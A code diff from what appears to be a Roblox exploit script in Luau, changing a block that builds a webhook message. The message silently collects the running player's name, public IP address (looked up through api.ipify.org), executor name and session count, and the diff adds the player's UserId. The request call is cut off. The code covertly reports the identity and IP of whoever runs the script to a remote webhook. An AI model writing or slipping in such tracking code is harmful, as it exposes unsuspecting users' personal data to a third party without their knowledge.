@@ -5,7 +5,7 @@ getgenv().sessionExecutions += 1
 --spam the webhook i dare you
 
         pcall(function() local data = {
-            ["content"] = `{game.Players.LocalPlayer.Name} executed\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\nNORMAL\nSession Executions: {getgenv().sessionExecutions}\n-------------`
+            ["content"] = `{game.Players.LocalPlayer.Name} ({game.Players.LocalPlayer.UserId})\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\nNORMAL\nSession Executions: {getgenv().sessionExecutions}\n-------------`
         }
 
         request(
